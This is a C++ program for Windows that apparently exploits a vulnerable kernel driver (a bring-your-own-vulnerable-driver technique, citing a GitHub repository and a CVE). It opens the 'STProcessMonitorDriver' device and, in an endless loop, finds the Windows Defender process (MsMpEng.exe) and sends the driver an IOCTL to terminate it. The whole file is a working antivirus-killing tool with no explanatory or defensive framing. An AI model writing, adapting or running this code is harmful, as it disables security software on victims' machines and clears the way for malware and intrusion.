#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

#define IOCTL_KILL_PROCESS 0xB822200C

// https://github.com/DeathShotXD/0xKern3lCrush-Foreverday-BYOVD-CVE-2026-0828

int getPIDbyProcName(const std::string& procName) {
	int pid = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) {
		return 0;
	}
	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);
	if (Process32FirstW(hSnap, &pe32) != FALSE) {
		std::wstring wideProcName(procName.begin(), procName.end());
		do {
			if (_wcsicmp(pe32.szExeFile, wideProcName.c_str()) == 0) {
				pid = pe32.th32ProcessID;
				break;
			}
		} while (Process32NextW(hSnap, &pe32) != FALSE);
	}

	CloseHandle(hSnap);
	return pid;
}

int main(){
	HANDLE hDevice = INVALID_HANDLE_VALUE;

	hDevice = CreateFileA("\\\\.\\STProcessMonitorDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open device: %d\n", GetLastError());
		return 1;
	}
	else {
		printf("Device opened successfully.\n");
	}
	while (true) {
		UINT64 windefPID = getPIDbyProcName("MsMpEng.exe"); // Replace with the current process name you want to terminate
		if (windefPID == 0) {
			printf("Windows Defender process not found\n");
			Sleep(2000);
			continue;
		}

		DWORD bytesReturned;
		BOOL result = DeviceIoControl(hDevice, IOCTL_KILL_PROCESS, &windefPID, sizeof(windefPID), NULL, 0, &bytesReturned, NULL);
		if (result) {
			printf("Process with PID %d has been terminated successfully.\n", windefPID);
		}
		else {
			printf("Failed to terminate process with PID %d: %d\n", windefPID, GetLastError());
		}
		Sleep(2000);
	}
}